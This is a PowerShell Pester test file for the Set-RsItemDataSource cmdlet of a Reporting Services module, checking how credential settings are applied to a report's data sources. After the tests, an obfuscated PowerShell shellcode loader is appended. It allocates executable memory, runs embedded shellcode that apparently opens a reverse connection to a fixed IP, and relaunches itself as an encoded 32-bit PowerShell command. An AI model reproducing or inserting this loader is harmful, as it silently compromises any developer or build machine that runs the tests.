


$reportServerUri = if ($env:PesterServerUrl -eq $null) { 'http://localhost/reportserver' } else { $env:PesterServerUrl }

Describe "Set-RsItemDataSource" { 
    $rsFolderPath = ''
    $datasourcesReportPath = ''

    BeforeEach {
        
        $folderName = 'SUT_OutRsRestCatalogItem_' + [guid]::NewGuid()
        New-RsFolder -ReportServerUri $reportServerUri -RsFolder / -FolderName $folderName
        $rsFolderPath = '/' + $folderName

        $localResourcesPath = (Get-Item -Path ".\").FullName  + '\Tests\CatalogItems\testResources\datasources'
        
        
        Write-RsCatalogItem -ReportServerUri $reportServerUri -Path "$localResourcesPath\datasourcesReport.rdl" -RsFolder $rsFolderPath
        $datasourcesReportPath = "$rsFolderPath/datasourcesReport"
    }

    AfterEach {
        Remove-RsCatalogItem -ReportServerUri $reportServerUri -RsItem $datasourcesReportPath -Confirm:$false
        Remove-RsCatalogItem -ReportServerUri $reportServerUri -RsItem $rsFolderPath -Confirm:$false
    }

    Context "Updates data sources with Proxy parameter" {
        $proxy = New-RsWebServiceProxy -ReportServerUri $reportServerUri

        It "Should allow integrated auth" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Integrated'
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Integrated'
        }

        It "Should allow stored auth with SQL credentials" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Store'
            $dataSources[0].Item.UserName = 'sqluser'
            $dataSources[0].Item.Password = 'sqluserpassword'
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Store'
            $updatedDataSources[0].Item.UserName | Should Be 'sqluser'
            $updatedDataSources[0].Item.Password | Should BeNullOrEmpty
            $updatedDataSources[0].Item.WindowsCredentials | Should Be False
            $updatedDataSources[0].Item.ImpersonateUser | Should Be False
        }

        It "Should allow stored auth with Windows credentials" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Store'
            $dataSources[0].Item.UserName = 'windowsuser'
            $dataSources[0].Item.Password = 'windowsuserpassword'
            $dataSources[0].Item.WindowsCredentials = $true
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Store'
            $updatedDataSources[0].Item.UserName | Should Be 'windowsuser'
            $updatedDataSources[0].Item.Password | Should BeNullOrEmpty
            $updatedDataSources[0].Item.WindowsCredentials | Should Be True
            $updatedDataSources[0].Item.ImpersonateUser | Should Be False
        }

        It "Should allow stored auth with SQL credentials and impersonation" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Store'
            $dataSources[0].Item.UserName = 'sqluser'
            $dataSources[0].Item.Password = 'sqluserpassword'
            $dataSources[0].Item.ImpersonateUser = $true
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Store'
            $updatedDataSources[0].Item.UserName | Should Be 'sqluser'
            $updatedDataSources[0].Item.Password | Should BeNullOrEmpty
            $updatedDataSources[0].Item.WindowsCredentials | Should Be False
            $updatedDataSources[0].Item.ImpersonateUser | Should Be True
        }

        It "Should allow stored auth with Windows credentials and impersonation" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Store'
            $dataSources[0].Item.UserName = 'windowsuser'
            $dataSources[0].Item.Password = 'windowsuserpassword'
            $dataSources[0].Item.WindowsCredentials = $true
            $dataSources[0].Item.ImpersonateUser = $true
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Store'
            $updatedDataSources[0].Item.UserName | Should Be 'windowsuser'
            $updatedDataSources[0].Item.Password | Should BeNullOrEmpty
            $updatedDataSources[0].Item.WindowsCredentials | Should Be True
            $updatedDataSources[0].Item.ImpersonateUser | Should Be True
        }

        It "Should allow prompt for SQL credentials" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Prompt'
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Prompt'
            $updatedDataSources[0].Item.WindowsCredentials | Should Be False
        }

        It "Should allow prompt for Windows credentials" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Prompt'
            $dataSources[0].Item.WindowsCredentials = $true
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Prompt'
            $updatedDataSources[0].Item.WindowsCredentials | Should Be True
        }

        It "Should allow prompt with message" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'Prompt'
            $dataSources[0].Item.Prompt = 'This is a prompt'
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'Prompt'
            $updatedDataSources[0].Item.Prompt | Should Be 'This is a prompt'
        }

        It "Should allow no credentials" {
            $dataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $dataSources.Count | Should Be 2

            $dataSources[0].Item.CredentialRetrieval = 'None'
            Set-RsItemDataSource -Path $datasourcesReportPath -DataSource $dataSources -Proxy $proxy -Verbose

            $updatedDataSources = Get-RsItemDataSource -Path $datasourcesReportPath -Proxy $proxy
            $updatedDataSources[0].Item.CredentialRetrieval | Should Be 'None'
        }
    }
}
$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xf5,0x80,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";$cmd = "-nop -noni -enc ";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& powershell $cmd $gq";}

